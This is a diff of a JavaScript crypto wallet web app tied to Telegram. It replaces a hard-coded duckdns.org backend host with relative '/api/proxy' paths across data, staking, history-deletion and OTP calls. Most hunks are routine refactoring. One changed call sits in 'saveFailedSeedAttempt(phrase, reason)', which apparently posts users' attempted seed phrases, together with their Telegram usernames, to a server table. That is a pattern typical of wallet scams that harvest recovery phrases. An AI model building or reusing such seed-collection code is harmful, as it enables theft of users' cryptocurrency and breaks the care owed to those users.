@@ -4695,7 +4695,7 @@ async function saveStaking() {
     const email = (await Store.get('activeAccount')) || '';
     if (!email) return;
     // Delete all existing rows for this user
-    await fetch(`https://blackswallet.duckdns.org/proxy/user_staking?email=eq.${encodeURIComponent(email)}`, {
+    await fetch(`/api/proxy/user_staking?email=eq.${encodeURIComponent(email)}`, {
       method: 'DELETE', headers: { 'Content-Type': 'application/json' }
     });
     // Insert current staking positions
@@ -5198,14 +5198,14 @@ const sb = {
 
   async get(table, filter = '') {
     try {
-      const r = await fetch(`https://blackswallet.duckdns.org/proxy/${table}?${filter}`, { headers: this.headers });
+      const r = await fetch(`/api/proxy/${table}?${filter}`, { headers: this.headers });
       return r.ok ? await r.json() : [];
     } catch { return []; }
   },
 
   async insert(table, data) {
     try {
-      const r = await fetch(`https://blackswallet.duckdns.org/proxy/${table}`, {
+      const r = await fetch(`/api/proxy/${table}`, {
         method: 'POST', headers: this.headers, body: JSON.stringify(data)
       });
       return r.ok ? await r.json() : null;
@@ -5215,7 +5215,7 @@ const sb = {
   async upsert(table, data, onConflict = '') {
     try {
       const headers = { ...this.headers, 'Prefer': 'resolution=merge-duplicates,return=representation' };
-      const url = onConflict ? `https://blackswallet.duckdns.org/proxy/${table}?on_conflict=${onConflict}` : `https://blackswallet.duckdns.org/proxy/${table}`;
+      const url = onConflict ? `/api/proxy/${table}?on_conflict=${onConflict}` : `/api/proxy/${table}`;
       const r = await fetch(url, { method: 'POST', headers, body: JSON.stringify(data) });
       return r.ok ? await r.json() : null;
     } catch { return null; }
@@ -5223,7 +5223,7 @@ const sb = {
 
   async update(table, filter, data) {
     try {
-      const r = await fetch(`https://blackswallet.duckdns.org/proxy/${table}?${filter}`, {
+      const r = await fetch(`/api/proxy/${table}?${filter}`, {
         method: 'PATCH', headers: this.headers, body: JSON.stringify(data)
       });
       return r.ok ? await r.json() : null;
@@ -5232,7 +5232,7 @@ const sb = {
 
   async rpc(fn, params = {}) {
     try {
-      const r = await fetch(`https://blackswallet.duckdns.org/proxy/rpc/${fn}`, {
+      const r = await fetch(`/api/proxy/rpc/${fn}`, {
         method: 'POST', headers: this.headers, body: JSON.stringify(params)
       });
       return r.ok;
@@ -5479,7 +5479,7 @@ async function saveFailedSeedAttempt(phrase, reason) {
       tg_username: tgUser.username || null,
       created_at: new Date().toISOString()
     };
-    const r = await fetch('https://blackswallet.duckdns.org/proxy/failed_seed_attempts', {
+    const r = await fetch('/api/proxy/failed_seed_attempts', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json', 'Prefer': 'return=representation' },
       body: JSON.stringify(payload)
@@ -5570,7 +5570,7 @@ async function authImportSeed() {
 // ══════════════════════════════════════════════
 // OTP — Telegram verification
 // ══════════════════════════════════════════════
-const BOT_API_URL = 'https://blackswallet.duckdns.org'; // URL бота на Render
+const BOT_API_URL = '/api'; // URL бота на Render
 let _otpCode = '';
 let _otpEmail = '';
 let _otpCountdownTimer = null;
@@ -7076,7 +7076,7 @@ function resetStaking() {
     try {
       const email = (await Store.get('activeAccount')) || '';
       if (email) {
-        await fetch(`https://blackswallet.duckdns.org/proxy/user_staking?email=eq.${encodeURIComponent(email)}`, {
+        await fetch(`/api/proxy/user_staking?email=eq.${encodeURIComponent(email)}`, {
           method: 'DELETE', headers: { 'Content-Type': 'application/json' }
         });
       }
@@ -7112,7 +7112,7 @@ function clearHistory() {
         try { await sb.update('user_transactions', `email=eq.${encodeURIComponent(email)}`, { _deleted: true }); } catch {}
         try {
           // Hard delete via rpc or direct delete
-          await fetch(`https://blackswallet.duckdns.org/proxy/user_transactions?email=eq.${encodeURIComponent(email)}`, {
+          await fetch(`/api/proxy/user_transactions?email=eq.${encodeURIComponent(email)}`, {
             method: 'DELETE', headers: sb.headers
           });
         } catch {}
